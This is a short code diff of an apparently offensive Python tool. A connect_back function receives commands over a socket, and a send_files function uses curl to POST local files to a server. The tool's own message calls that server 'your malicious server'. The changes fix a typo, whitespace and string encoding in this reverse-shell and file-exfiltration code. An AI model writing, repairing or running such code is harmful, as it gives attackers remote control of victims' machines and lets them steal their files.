@@ -25,7 +25,7 @@ def send_files(args):
         return
     curl_cmd = ["curl", "-X", "POST"]
     for file_path in valid_files:
-        curl_cmd.extend(["-F", f"files=@{file_path}"])  
+        curl_cmd.extend(["-F", f"files=@{file_path}"])
     curl_cmd.append(f"{SERVER_URL}/upload")
     try:
         result = subprocess.run(curl_cmd, capture_output=True, text=True)
@@ -53,7 +53,7 @@ def connect_back():
             if cmd.startswith("send"):
                 args_files = cmd.split()
                 send_files(args_files)
-                s.send("Files has been sent to your mailicous server")
+                s.send("Files has been sent to your malicious server".encode("utf-8"))
                 continue
             if cmd.lower() == "exit":
                 break
